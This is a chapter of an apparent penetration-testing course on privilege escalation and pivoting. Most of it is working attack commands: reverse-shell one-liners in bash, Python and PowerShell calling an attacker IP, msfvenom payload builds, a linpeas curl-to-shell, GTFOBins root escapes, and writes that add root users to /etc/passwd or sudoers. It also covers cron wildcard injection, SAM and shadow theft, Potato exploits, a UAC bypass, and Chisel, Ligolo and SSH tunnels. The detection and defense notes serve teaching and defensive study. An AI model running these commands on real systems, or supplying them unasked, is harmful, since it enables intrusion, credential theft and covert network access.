---
title: "12. Escalation and Exploitation"
order: 12
part: "Post-Exploitation & Active Directory"
description: "Linux and Windows privilege escalation, pivoting and tunneling, data exfiltration and situational awareness."
---

```
foothold (low privilege) → situational awareness → local privesc (root/SYSTEM)
   → harvest credentials → pivot/tunnel → new host(s) → (repeat) → exfil
```

## 12.1 Fundamental concepts of exploitation and shell management

Before moving on to privilege escalation, you need to understand and improve the shell you have.

**Shell types (why they matter):**

| Concept | Description | When |
| --- | --- | --- |
| **Bind shell** | The target opens a port and listens; you connect to it. | When you can reach the target directly (the target firewall allows the incoming connection). |
| **Reverse shell** | The target connects back to YOU. | Most cases; the target usually allows outbound connections (egress) but not inbound. **Default choice.** |
| **Staged payload** | A small "stager" is downloaded, which then pulls the actual payload (`windows/meterpreter/reverse_tcp`). | Size-constrained exploit space; AV evasion. |
| **Stageless payload** | The whole payload is a single piece (`windows/meterpreter_reverse_tcp`). | When little network noise is wanted and the stager download is unreliable. |
| **Interactive / TTY** | A full terminal; `sudo`, `su`, `ssh`, tab-completion, job control work. | Usually required for privesc. |

**Reverse shell listener and example payloads:**

```
# Attacker-side listener
nc -lvnp 4444                       # -l listen, -v verbose, -n no DNS, -p port
rlwrap nc -lvnp 4444                # rlwrap: adds arrow key/history support

# Hedefte tetiklenecek reverse shell'ler
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1      # Linux bash
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.14.5",4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];subprocess.call(["/bin/sh","-i"])'
# Windows PowerShell one-liner (nishang Invoke-PowerShellTcp logic)
powershell -nop -c "$c=New-Object Net.Sockets.TCPClient('10.10.14.5',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$sb=([Text.Encoding]::ASCII).GetBytes($r);$s.Write($sb,0,$sb.Length);$s.Flush()}"
```

**Upgrading a dumb shell to a full TTY (Linux), a critical step before privesc:**

```
python3 -c 'import pty;pty.spawn("/bin/bash")'   # fake TTY
# background it with CTRL+Z, then:
stty raw -echo ; fg                               # put the local terminal into raw mode
export TERM=xterm ; export SHELL=/bin/bash        # fix screen size/color
# Alternative: script /dev/null -c bash   or   full PTY with socat
```

Producing standalone payloads with msfvenom (for Metasploit integration see Section 7):

```
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o shell.elf
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o s.exe
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.5 LPORT=443 -f exe -o s.exe  # hidden inside HTTPS
```

**Note:** A payload meant to run over a SOCKS proxy usually needs **not** a **reverse_tcp** but a **bind shell** or a proxy-aware HTTP(S) payload; do not confuse the direction of the tunnel with a loop. Also, privesc exploits usually require an **interactive TTY**: in a dumb reverse shell `sudo` gives a "no tty present" error; upgrade the TTY first.

## 12.2 Linux privilege escalation

Goal: from a low-privileged user to **root (uid=0)**. The method is always the same: **enumerate → find a misconfiguration/vulnerability → exploit it.**

### 12.2.1 Automatic enumeration tools

| Tool | What it does | Running | Note |
| --- | --- | --- | --- |
| **linpeas.sh** | The most comprehensive; scans every privesc vector with color coding. | `curl -L http://10.10.14.5/linpeas.sh \| sh` or download+run | **Red/yellow** highlight = 95% privesc vector. |
| **LinEnum.sh** | Classic, lighter enumeration. | `./LinEnum.sh -t -r report` | `-t` thorough (long) tests. |
| **linux-exploit-suggester (LES2)** | Suggests kernel exploits based on `uname`/package version. | `./linux-exploit-suggester.sh` | Focus on the "probable" entries in the output. |
| **pspy (pspy64)** | Watches processes/cron jobs running live without root. | `./pspy64 -pf -i 1000` | **The only way to catch hidden cron/periodic root scripts.** |
| **unix-privesc-check** | Configuration audit. | `./unix-privesc-check standard` | Old but fast. |

Tools may not always be at hand; you should know the following **manual enumeration** commands by heart.

```
# Identity and privilege
id ; sudo -l                        # who I am and what I can sudo (NOPASSWD?)
cat /etc/passwd ; cat /etc/group    # users, group memberships (docker/lxd/disk?)
# System / kernel
uname -a ; cat /etc/os-release      # kernel version → searchsploit / LES2
cat /proc/version ; lscpu
# SUID / SGID / capabilities
find / -perm -4000 -type f 2>/dev/null      # SUID (runs as root if owner is root)
find / -perm -2000 -type f 2>/dev/null      # SGID
getcap -r / 2>/dev/null                     # capabilities (cap_setuid=ep → root)
# Scheduled tasks
cat /etc/crontab ; ls -la /etc/cron.* /etc/cron.d/
cat /var/spool/cron/crontabs/* 2>/dev/null
ps aux ; ./pspy64                           # live periodic processes
# File permissions / writability
find / -writable -type d 2>/dev/null        # writable directories
find / -perm -2 ! -type l -ls 2>/dev/null   # world-writable
ls -la /etc/passwd /etc/shadow              # are these writable?
# Network / secrets / mount
ip a ; ip route ; ss -tulpn ; arp -a        # internal network discovery (for pivoting)
mount ; cat /etc/fstab ; cat /etc/exports   # NFS no_root_squash?
env ; cat ~/.bash_history ; cat ~/.*_history 2>/dev/null
grep -rE "password|passwd|secret|api[_-]?key" /etc /var/www /opt 2>/dev/null
```

**Note:** Privesc is not always an "exploit", in the vast majority of cases it is a **misconfiguration** (sudo rule, SUID, cron, capability). First look at `sudo -l`, SUID, and capabilities; a kernel exploit is a last resort (the risk of crashing the system is high, and the principle "safest path first" applies).

### 12.2.2 sudo rules and GTFOBins (the most common path)

If `sudo -l` shows permission to run certain binaries as root (usually `NOPASSWD`), and that binary provides a **shell escape** or **file read/write**, you become root. Reference: **GTFOBins** (gtfobins.github.io), which lists the `sudo`, `SUID`, and `capabilities` exploitation of each binary. `why it works`: the sudo command starts with root euid; if the command offers a way to run a shell/command from within itself, that becomes a root shell.

```
sudo -l            # example output: (root) NOPASSWD: /usr/bin/find, /usr/bin/vim, /usr/bin/less
```

GTFOBins sudo shell-escape examples (very commonly seen):

```
sudo vim -c ':!/bin/sh'                                   # shell from vim command mode
sudo find . -exec /bin/sh \; -quit                        # find -exec
sudo awk 'BEGIN {system("/bin/sh")}'                      # awk system()
sudo perl -e 'exec "/bin/sh";'                            # perl exec
sudo python3 -c 'import os; os.system("/bin/sh")'         # python
sudo less /etc/profile                                    # from within the pager: !/bin/sh
sudo man man                                              # pager: !/bin/sh
sudo env /bin/sh                                          # env runs the command directly
sudo gdb -nx -ex '!sh' -ex quit                           # gdb shell escape
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
sudo ftp                                                  # ftp prompt: !/bin/sh
# Binaries that don't give a shell but READ/WRITE FILES also provide privesc:
sudo cat /etc/shadow                                      # read the hash → hashcat (see Chapter 13)
echo 'root2:$1$abc$...:0:0::/root:/bin/bash' | sudo tee -a /etc/passwd
LFILE=/etc/sudoers; echo 'user ALL=(ALL) NOPASSWD:ALL' | sudo tee -a $LFILE   # with cp/tee/dd
```

**sudo side traps:** If `LD_PRELOAD`/`LD_LIBRARY_PATH` is preserved with `env_keep`, a malicious `.so` can be loaded to get a root shell:

```
# In sudo -l output: if you see env_keep+=LD_PRELOAD
# shell.c: via __attribute__((constructor)): setuid(0); system("/bin/bash");
gcc -fPIC -shared -nostartfiles -o /tmp/x.so shell.c
sudo LD_PRELOAD=/tmp/x.so <allowed_command>
```

**Detection/Defense:** `/var/log/auth.log` (Debian) or `/var/log/secure` (RHEL) records all `sudo` calls (the `COMMAND=` field). I/O logging (`Defaults log_output`) also keeps the command output. Defense: in `sudoers`, do not grant binaries that can do a shell-escape (vim, less, find, awk, tar...) nor `NOPASSWD`; enforce `noexec`; fix PATH with `secure_path`.

**Note:** Watch that the path in the `sudo -l` output is a **full path** (e.g. `/usr/bin/vim`); if there is a wildcard (`*`) or a relative path, additional exploitation (argument injection) is possible.

### 12.2.3 SUID / SGID binaries + GTFOBins

A binary that has the SUID bit set (`-rwsr-xr-x`) and is owned by root runs with **root euid** for everyone who runs it. The "SUID" section of GTFOBins gives the exploitation. Critical difference: with SUID, euid=root but ruid=you; for the shell to stay root, **`-p` (privileged)** is required.

```
find / -perm -4000 -type f 2>/dev/null       # SUID list
# Examples (if SUID bit is set):
./find . -exec /bin/sh -p \; -quit           # -p euid'i korur
./bash -p                                     # if bash is SUID, -p is required
./cp /etc/shadow /tmp/shadow                  # cp SUID → read hidden file
./nano /etc/shadow                            # edit shadow with the editor
# Custom/vendor SUID binaries: inspect internals with strings/ltrace
strings /usr/local/bin/ozel_suid | grep -i -E "system|exec|/bin|cp |sh"
ltrace ./ozel_suid                            # does it call system() or a relative command?
```

**Detection/Defense:** New/unexpected SUID binaries are periodically audited with `find`; AIDE/Tripwire monitor integrity. Block SUID on writable partitions with `mount -o nosuid`. Remove unnecessary SUID bits (`chmod u-s`).

**Note:** If you do not put `-p` in a SUID shell, bash drops privileges (`euid` is not preserved) and you cannot become root. In GTFOBins each binary's SUID variant is listed separately, do not confuse it with the sudo variant.

### 12.2.4 Linux capabilities

Capabilities are the divisible privileges of root; a specific power can be given to a binary without granting SUID. If misassigned, privesc results.

| Capability | Effect / Exploitation |
| --- | --- |
| `cap_setuid+ep` | Change UID → `setuid(0)` → root. The most dangerous. |
| `cap_setgid+ep` | Change GID. |
| `cap_dac_read_search+ep` | Bypasses the file read permission check → read `/etc/shadow`, SSH keys. |
| `cap_dac_override+ep` | Bypasses all file write checks → write `/etc/passwd`. |
| `cap_sys_admin+ep` | Very broad; root via mount etc. |
| `cap_sys_ptrace+ep` | Injection into process memory. |

```
getcap -r / 2>/dev/null                        # scan
# cap_setuid examples:
./python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
./perl -e 'use POSIX qw(setuid); setuid(0); exec "/bin/sh";'
# cap_dac_read_search → arbitrary file read (not write):
./tar xf /etc/shadow -O 2>/dev/null            # or read with gdb/python
getcap /usr/bin/python3.8                       # e.g.: cap_setuid+ep
```

**Detection/Defense:** An unexpected capability is found with a `getcap -r /` audit. Principle: instead of giving a binary a capability, use a narrower method; `cap_setuid` is never given to user-accessible binaries.

**Note:** In the `getcap` output, **`+ep`** (effective+permitted) is active; if it is only `+p`, the binary may stay passive unless it calls `cap_set_proc` itself. `cap_dac_read_search` **reads but does not write**, so you cannot add a line to `/etc/passwd` with it; `cap_dac_override` writes.

### 12.2.5 Cron job exploitation (writable script / PATH / wildcard)

Cron jobs run by root are exploited in three ways. Look at the periodic processes made visible with `pspy`.

```
cat /etc/crontab                      # see PATH and scheduled commands
ls -la /path/to/cron_script.sh        # is the script writable by you?
```

**(a) Writable script:** If the root cron runs a script you can write to, add a reverse shell/command inside it:

```
echo 'cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' >> /path/writable.sh
# when cron runs:  /tmp/rootbash -p   → root
```

**(b) Cron PATH hijack:** If the `PATH=` in `/etc/crontab` starts with a directory you can write to (e.g. `PATH=/home/user:/usr/bin`) and the cron command **does not use a full path** (e.g. it only calls `backup`), place a malicious binary by that name:

```
echo -e '#!/bin/bash\ncp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash' > /home/user/backup
chmod +x /home/user/backup            # cron finds the "backup" job in your directory
```

**(c) Wildcard injection (tar/rsync/chown):** If the cron uses a wildcard such as `tar czf backup.tgz *` in a directory you can write to, inject filenames as arguments:

```
cd /writable/dir
echo 'cp /bin/bash /tmp/rb; chmod +s /tmp/rb' > runme.sh
touch -- '--checkpoint=1'
touch -- '--checkpoint-action=exec=sh runme.sh'   # tar thinks these are flags → sh runme.sh
# when cron's tar runs, runme.sh runs as root
```

**Detection/Defense:** Cron scripts should be root-only and not world-writable; use **full paths** in cron commands; call with an explicit file list or a `./` prefix instead of a wildcard. Changes appear in the `/var/log/syslog`/`cron` log.

**Note:** Without `pspy` you may not see a hidden root cron, so **always run pspy** during enumeration. Wildcard injection only works when the command is called with `*` and the arguments are ordered first.

### 12.2.6 PATH hijack (when a SUID/sudo binary calls a relative command)

If a SUID binary or a sudo-permitted script calls a command from within it **without a full path** (`system("service ...")`, `ps`, `cat`), you run a fake command by controlling the PATH.

```
strings ./suid_binary | grep -E '^[a-z]+$'   # find relative command names (e.g. "ps")
cd /tmp
echo -e '#!/bin/bash\n/bin/bash -p' > ps
chmod +x ps
export PATH=/tmp:$PATH                         # fake ps gets found first
./suid_binary                                  # root shell
```

**Detection/Defense:** Developers should use an **absolute path** with `execve` instead of `system()`/`popen()`; PATH should be cleaned in a SUID program. For detection, unexpected `/tmp` executions (an execve auditd rule) are monitored.

### 12.2.7 Writable /etc/passwd and /etc/shadow

If `/etc/passwd` is writable, you add a **root line** with an embedded password hash (legacy format support); if `/etc/shadow` is writable, you change the root hash.

```
ls -l /etc/passwd /etc/shadow            # -rw-rw-rw- → writable
openssl passwd -1 -salt xyz Parola123    # generate $1$ (MD5-crypt) hash
# write hash to /etc/passwd second field (instead of x), uid/gid 0:
echo 'hacker:$1$xyz$HASH...:0:0:root:/root:/bin/bash' >> /etc/passwd
su hacker                                # Parola123 → root
# Alternative: replace root's hash in /etc/shadow with a hash you know
```

**Detection/Defense:** These files should be `root:root 644`/`shadow 640`; they must never be writable. AIDE/auditd alert on writes to these files (`-w /etc/passwd -p wa`). A line in `/etc/passwd` with a filled second (hash) field and uid=0 is an indicator of compromise.

**Note:** On modern systems the hash is in `/etc/shadow` and `/etc/passwd` has `x`; but if you put a hash directly in the second field of `passwd`, the system accepts it without looking at `shadow` (backward compatibility). `openssl passwd -1` (MD5) works everywhere; `-6` (SHA-512) is stronger but not recognized on some old systems.

### 12.2.8 NFS no_root_squash

If a share is exported with `no_root_squash` in `/etc/exports`, you can write a SUID binary to that share as **root on your own machine**; the target machine runs this SUID as root (because root squash is disabled, uid 0 is preserved).

```
# See the vulnerability on the target:
cat /etc/exports        # /srv  *(rw,no_root_squash)
showmount -e TARGET_IP  # externally exposed shares
# On attacker machine (as root):
mkdir /mnt/nfs ; mount -o rw TARGET_IP:/srv /mnt/nfs
cp /bin/bash /mnt/nfs/rootbash
chown root:root /mnt/nfs/rootbash ; chmod +s /mnt/nfs/rootbash
# On target (low-privileged user):
/srv/rootbash -p        # euid=0 → root
```

**Detection/Defense:** On NFS, **`root_squash`** (the default) should remain; `no_root_squash` should never be used. The `all_squash` and `nosuid` mount options are additional defenses. Export auditing and NFS access logging are performed.

**Note:** For this attack you need to be **root** on the attacker machine and have **write** permission on the NFS; if you only have read, you cannot create a SUID. Look for the `no_root_squash` phrase in `/etc/exports`.

### 12.2.9 Docker / lxd / disk group membership

Certain group memberships are effectively equal to root, because these groups control services that provide root access to the host filesystem.

```
id    # if you see groups=...docker or lxd/lxc or disk:
# docker group → mount host root into the container, chroot:
docker run -v /:/mnt --rm -it alpine chroot /mnt sh    # /mnt = host /, now root
# lxd/lxc group → mount host with privileged container:
lxc image import ./alpine.tar.gz --alias priv
lxc init priv c1 -c security.privileged=true
lxc config device add c1 host disk source=/ path=/mnt/root recursive=true
lxc start c1 ; lxc exec c1 /bin/sh      # /mnt/root = host /
# disk group → read-write the raw disk with debugfs/dd:
debugfs /dev/sda1       # cat /etc/shadow, read arbitrary file
```

**Detection/Defense:** Adding a user to the `docker`/`lxd` groups = giving root; use rootless Docker or restrict access. Running containers (`docker run`) and creating privileged containers appear in the auditd/Docker daemon log.

**Note:** When you see `docker`/`lxd`/`disk` in the `id` output, handle the privesc without searching for an exploit, these memberships are root-equivalent by design.

### 12.2.10 Kernel and service vulnerabilities (last resort)

If there is no misconfiguration, a local exploit matching the **kernel/package version** is used. Match with `uname -r` + `searchsploit`/LES2. Kernel exploits can crash the system, so use them with permission and a backup.

| Vulnerability | CVE | Affected | Logic / Use |
| --- | --- | --- | --- |
| **DirtyCow** | CVE-2016-5195 | Linux kernel < 4.8.3 (2.6.22+) | COW (copy-on-write) race condition; write to read-only memory → modify `/etc/passwd` or a SUID. `dirtyc0w.c`, `dirty.c`. |
| **DirtyPipe** | CVE-2022-0847 | Kernel 5.8 - 5.16.11/5.15.25/5.10.102 | Pipe buffer flag bug; arbitrary write to a read-only file → root. In CISA KEV (actively exploited). |
| **PwnKit (pkexec)** | CVE-2021-4034 | polkit `pkexec` (most distributions, since 2009) | `argv` memory corruption; local user → root. Single shot, very reliable. Disclosed by Qualys. |
| **Polkit auth bypass** | CVE-2021-3560 | polkit 0.113+ (accountsservice/D-Bus) | D-Bus race condition; create a privileged user with `dbus-send`. |
| **Baron Samedit (sudo)** | CVE-2021-3156 | sudo 1.8.2-1.8.31p2, 1.9.0-1.9.5p1 | `sudoedit -s` heap-based buffer overflow; if the argument ends with a single `\`. Fix: **1.9.5p2**. |
| **sudoedit extra args** | CVE-2023-22809 | sudo 1.8.0-1.9.12p1 | inject an extra file with `--` into `SUDO_EDITOR`/`EDITOR`/`VISUAL` → edit an arbitrary file. Fix: **1.9.12p2**. |
| **sudo chroot** | CVE-2025-32463 | sudo 1.9.14-1.9.17 | `sudo -R` (chroot) root gain via NSS. Fix: **1.9.17p1**. CISA KEV. |

```
uname -r                                  # kernel version
searchsploit linux kernel 5.10            # search local exploits
searchsploit -m 50808.c                   # copy the exploit (e.g. PwnKit)
gcc -o pe exploit.c && ./pe               # compile + run
# PwnKit (precompiled C):
./PwnKit                                   # instant root (if polkit is enabled)
# Baron Samedit tespiti:
sudoedit -s '\' $(python3 -c 'print("A"*1000)')   # crash → vulnerable
sudo --version                             # confirm the version (< 1.9.5p2 = vulnerable)
```

**systemd/service, ld.so.preload vectors:**

```
# Writable .service file or ExecStart target:
find /etc/systemd/ -writable 2>/dev/null
# Turn ExecStart into a reverse shell, then (if you have the rights) restart the service
# Writable /etc/ld.so.preload → inject .so into all root processes:
ls -l /etc/ld.so.preload                   # if writable, add the x.so path
```

**Detection/Defense:** Patch management is the primary defense (keep kernel + sudo + polkit up to date). With `auditd`, `execve` and sudden `uid=0` transitions are monitored; for PwnKit, an unusual `pkexec` call and the `GCONV_PATH`/empty `argv` indicators are logged. Kernel exploits usually leave a segfault/oops in `dmesg`. `noexec`/`nosuid` mount and SELinux/AppArmor make exploitation harder.

**Note:** Do not confuse the CVE numbers: **PwnKit = CVE-2021-4034 (pkexec)**, **Baron Samedit = CVE-2021-3156 (sudo)**, **DirtyPipe = CVE-2022-0847**, **DirtyCow = CVE-2016-5195**. "polkit" is two separate CVEs (4034 memory corruption, 3560 D-Bus bypass). A kernel exploit is the **last** path to try because it carries the risk of crashing the machine and causing a blackout.

## 12.3 Windows privilege escalation

Goal: from a low-privileged user or service account to **NT AUTHORITY\SYSTEM** (or at least local Administrator). For the domain environment see Section 14 (AD); here it is **local** privesc.

### 12.3.1 Automatic enumeration tools

| Tool | What it does | Running |
| --- | --- | --- |
| **winPEASx64.exe** | The most comprehensive local privesc scanner. | `winPEASx64.exe quiet` (colored vectors) |
| **PowerUp.ps1** | PowerShell-based; service/registry/ACL checks. | `. .\PowerUp.ps1; Invoke-AllChecks` |
| **SharpUp.exe** | C# port of PowerUp. | `SharpUp.exe audit` |
| **Seatbelt.exe** | Broad host information/credential collection. | `Seatbelt.exe -group=all` |
| **accesschk.exe** (Sysinternals) | File/service/registry ACL audit. | `accesschk.exe -accepteula ...` |
| **wesng** (Windows Exploit Suggester NG) | Missing patches based on `systeminfo` → exploit. | `wes.py systeminfo.txt` (on the attacker side) |

```
whoami /priv              # TOKEN PRIVILEGES - the most critical output
whoami /groups            # group memberships (Administrators? Backup Operators?)
whoami /all
systeminfo                # patch level, OS build → feed to wesng
wmic qfe list brief       # installed KB patches (extract the missing one)
# Or PowerShell:  Get-HotFix
net user ; net localgroup administrators
```

### 12.3.2 Token privileges (whoami /priv), the most common Windows path

Service accounts (IIS `iis apppool`, MSSQL, etc.) are limited users but have powerful **privileges**. The ones that are **Enabled** in the `whoami /priv` output are exploited.

| Privilege | Exploitation | Tool |
| --- | --- | --- |
| **SeImpersonatePrivilege** | Escalate to SYSTEM with an impersonation token. Very common on service accounts. | **PrintSpoofer, GodPotato, RoguePotato, JuicyPotato** |
| **SeAssignPrimaryTokenPrivilege** | Same family (Potato) attacks. | GodPotato / Juicy |
| **SeBackupPrivilege** | Right to read all files → copy SAM+SYSTEM / NTDS.dit. | `reg save`, `robocopy /b`, diskshadow |
| **SeRestorePrivilege** | Write to protected files → modify a service binary/registry. | `reg restore` |
| **SeTakeOwnershipPrivilege** | Take ownership of any object → then change the ACL. | `takeown`, `icacls` |
| **SeDebugPrivilege** | Access to every process → LSASS dump / process injection. | Mimikatz, `rundll32 comsvcs.dll` |
| **SeLoadDriverPrivilege** | Load a vulnerable signed driver → kernel code execution. | Capcom.sys etc. |

**Potato attacks (SeImpersonate → SYSTEM):** `why it works`: in Windows's COM/RPC authentication flow, the attacker redirects SYSTEM's authentication to themselves and impersonates the resulting token.

```
REM PrintSpoofer (if the Spooler service is on; preferred on modern systems)
PrintSpoofer.exe -i -c cmd                 REM interaktif SYSTEM cmd
PrintSpoofer.exe -c "C:\temp\rev.exe"      REM run a single command

REM GodPotato (widest compatibility: Win8-11 / Server 2012-2022)
GodPotato.exe -cmd "cmd /c whoami"
GodPotato.exe -cmd "C:\temp\rev.exe"

REM JuicyPotato (OLD: works before Server 2019 / Win10 1809)
JuicyPotato.exe -t * -p C:\Windows\System32\cmd.exe -a "/c whoami" -l 1337
```

**Stealing SAM/SYSTEM with SeBackupPrivilege (for password hashes, see Section 13):**

```
reg save HKLM\SAM C:\temp\sam.hive
reg save HKLM\SYSTEM C:\temp\system.hive
REM on the attacker side: secretsdump.py -sam sam.hive -system system.hive LOCAL
```

**Detection/Defense:** Potato attacks create a sudden token impersonation to SYSTEM and unusual named-pipe/COM activity; they are seen with **Event ID 4624 (Logon Type 9 / new identity)**, **4672 (special privilege assigned)** and Sysmon pipe/process create. Defense: remove unnecessary `SeImpersonate` from service accounts (it is there by default, but break the exploit chain), disable the Spooler, protect LSASS with Credential Guard.

**Note:** When you see **SeImpersonatePrivilege = Enabled** in the `whoami /priv` output, the reflex is: **Potato → SYSTEM**. Which Potato? For modern systems (Server 2019+/Win10 1809+) **PrintSpoofer/GodPotato**; for older systems **JuicyPotato** (Juicy does not work after 1809 due to the COM change).

### 12.3.3 Unquoted service path

If a service's `ImagePath` contains a space but is **unquoted** (`C:\Program Files\My App\svc.exe`), Windows parses the path from the left and tries, in order, `C:\Program.exe`, `C:\Program Files\My.exe`. If you can write to one of the intermediate paths and can restart the service, you run code.

```
REM Find vulnerable services:
wmic service get name,displayname,pathname,startmode | findstr /i "auto" | findstr /i /v "c:\windows\\" | findstr /i /v """
sc qc <service>                          REM is BINARY_PATH_NAME quoted?
REM if C:\ or C:\Program Files\ is writable:
icacls "C:\Program Files"               REM do you have (M)/(W) permission?
copy evil.exe "C:\Program.exe"          REM runs when the service starts
sc stop <service> & sc start <service>    REM or reboot
```

**Detection/Defense:** All service `ImagePath` values should be quoted. Creating a new file (`C:\Program.exe`) and restarting a service appear in the logs.

### 12.3.4 Weak service permissions (changing binPath)

If you have `SERVICE_CHANGE_CONFIG`/`SERVICE_ALL_ACCESS` permission on the service object, you change the binary that runs and execute a command as SYSTEM.

```
accesschk.exe -accepteula -uwcqv "Users" *       REM services the user can write to
accesschk.exe -accepteula -uwcqv %USERNAME% *
sc qc <service>                                    REM current binPath and account (LocalSystem?)
sc config <service> binpath= "net localgroup administrators user /add"
sc stop <service> & sc start <service>              REM command runs as SYSTEM
REM Note: a SPACE after binpath= is required (sc syntax)
```

Similarly, **weak registry ACL**: if you can write to the `HKLM\SYSTEM\CurrentControlSet\Services\<service>` key, change the `ImagePath` (PowerUp finds this too).

**Detection/Defense:** Service ACLs are granted with the principle of least privilege; a binPath change via `sc config` appears as **Event ID 7045 (new service)** or a service change, and as **4697** (Security log, if auditing is on). Defense: harden service permissions, monitor unauthorized `sc config`/registry writes.

### 12.3.5 AlwaysInstallElevated (SYSTEM via MSI)

If both registry keys are `1`, any user can install an `.msi` package as **SYSTEM**.

```
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
REM vulnerable if both are 0x1. On the attacker side, build an MSI:
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=443 -f msi -o evil.msi
REM hedefte:
msiexec /quiet /qn /i C:\temp\evil.msi
```

**Detection/Defense:** This policy should never be enabled (even Microsoft calls it a "vulnerability"). Unusual installations with `msiexec` and **Event ID 1033/11707 (MsiInstaller)** are monitored.

### 12.3.6 Stored credentials: Autologon, cmdkey, DPAPI

```
REM Plaintext autologon password:
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" | findstr /i "DefaultUserName DefaultPassword AutoAdminLogon"
REM Saved credentials:
cmdkey /list                              REM any saved credentials?
runas /savecred /user:ADMIN "cmd /c whoami"   REM run as admin without a password prompt
REM Other sources: Unattend.xml, sysprep.inf, Groups.xml (GPP), web.config,
REM PowerShell history (ConsoleHost_history.txt), KeePass/stored files
```

**Detection/Defense:** `DefaultPassword` should not be kept in plaintext in the registry (use LAPS). The use of `runas /savecred` produces **4648 (logon with explicit credentials)**.

### 12.3.7 DLL hijack, UAC bypass, kernel and scheduled task

**DLL hijacking:** If a privileged process loads a DLL that is missing, from a directory you can write to or one found during the search, you place a malicious DLL. With `Process Monitor` you look for a "NAME NOT FOUND" + writable-path match.

**UAC bypass** (you are an admin member but at medium integrity → rise to high; technically not privesc but an integrity bypass):

```
REM fodhelper (auto-elevate + registry hijack) - klasik UAC bypass
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /d "cmd.exe" /f
reg add HKCU\Software\Classes\ms-settings\Shell\Open\command /v DelegateExecute /f
fodhelper.exe       REM high integrity cmd
REM eventvwr.exe, sdclt.exe benzer tekniklerdir (UACME koleksiyonu)
```

**Kernel exploit (if the patch is missing):**

```
systeminfo > sysinfo.txt
REM on the attacker side:  python wes.py sysinfo.txt --exploits-only
REM run the matching MSxx-xxx / CVE exploit (e.g. MS16-032, PrintNightmare CVE-2021-34527)
```

**Scheduled task abuse:** If there is a high-privileged task that runs a script you can write to, modify the script:

```
schtasks /query /fo LIST /v | findstr /i "SYSTEM Task To Run"
icacls "C:\path\to\task_script.bat"      REM is it writable?
```

**Detection/Defense:** For PrintNightmare **CVE-2021-34527** (Spooler RCE/LPE), disable/patch the Spooler. UAC bypasses appear in Sysmon as a registry hijack (`ms-settings`, `mscfile`) and an auto-elevate binary execution. Scheduled task creation is **Event ID 4698**, a change is **4702**. Kernel exploits leave driver loading / system instability. Patch management + LAPS + AppLocker/WDAC are the basic defense.

**Note:** UAC bypass ≠ real privesc; it only moves an **admin** user from medium to high integrity (it does not make a standard user an admin). The most critical vectors are token privileges (SeImpersonate/SeBackup) and service misconfigurations (unquoted path, weak ACL).

## 12.4 Pivoting and tunneling (reaching another network)

The foothold machine is connected to an internal network (e.g. `10.10.20.0/24`) that you cannot reach directly. You make it a **pivot (stepping stone)** and direct your tools into the internal network. Three basic methods: **port forwarding** (a single port), **SOCKS proxy** (many targets, with proxychains), **tun/VPN-like** (full IP access).

### 12.4.1 Chisel (reverse/forward SOCKS), the most common

`why`: Chisel sets up an encrypted tunnel over HTTP; in **reverse** mode the tunnel is opened from the target toward you (it gets past the egress firewall), and it listens on a SOCKS proxy on your side.

```
# Reverse SOCKS (most common) - the target connects back to you from inside:
# Attacker (server):
./chisel server -p 8000 --reverse
# Target (client):
./chisel client 10.10.14.5:8000 R:socks       # R: reverse; SOCKS opens on the attacker at 127.0.0.1:1080
# Forward SOCKS (if you can reach the target directly):
# Target:      ./chisel server -p 8000 --socks5
# Attacker:  ./chisel client TARGET:8000 1080:socks
# Single port reverse forward (e.g. pull internal RDP to local):
./chisel client 10.10.14.5:8000 R:3389:10.10.20.5:3389
```

Then scan the internal network with proxychains (see below).

### 12.4.2 Ligolo-ng (tun interface, no proxychains needed)

`why`: Ligolo-ng creates a **tun (virtual network)** interface on the attacker side; you add an `ip route` to the internal subnet and all your tools (including nmap `-sS`, SYN scan) run natively, there is no proxychains limitation.

```
# Attacker (proxy): prepare the tun interface first
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert                             # -selfcert: self-signed TLS; (-autocert if there is internet)
# Target (agent):
./agent -connect 10.10.14.5:11601 -ignore-cert   # -ignore-cert: accept the self-signed certificate
# proxy konsolunda:
session                                       # list connected agents, pick one
start                                         # start the tunnel
# in the attacker shell, route the internal subnet to the ligolo interface:
sudo ip route add 10.10.20.0/24 dev ligolo
nmap -sS 10.10.20.0/24                        # now native scans (including SYN scan) work
```

**Tool choice:** If you need one or two ports, SSH/socat; to scan many targets over TCP, **Chisel + proxychains**; for full network access/UDP/SYN scan, **Ligolo-ng**.

### 12.4.3 SSH tunnels and ProxyJump

If SSH is available, no extra tool is needed. `why`: SSH is already an encrypted channel; it carries ports/proxy with `-L/-R/-D`.

```
ssh -D 1080 user@pivot                        # dynamic SOCKS proxy (with proxychains)
ssh -L 8080:10.10.20.5:80 user@pivot          # local forward: local 8080 → internal_host:80
ssh -R 2222:127.0.0.1:22 user@attacker_vps    # reverse forward: the target opens its SSH to you
ssh -J user@pivot user@10.10.20.5             # ProxyJump: hop to an internal host through the pivot
# On Windows, reverse with plink (PuTTY CLI):
plink.exe -ssh -R 2222:127.0.0.1:3389 user@attacker_vps -pw PASS
```

**sshuttle (poor-man's VPN):** Routes an entire subnet over SSH without proxychains:

```
sshuttle -r user@pivot 10.10.20.0/24          # push internal subnet traffic through SSH
```

**socat relay** (port forwarding, when there is no SSH):

```
# On the pivot: forward incoming 8080 to internal host:80
socat TCP-LISTEN:8080,fork,reuseaddr TCP:10.10.20.5:80
```

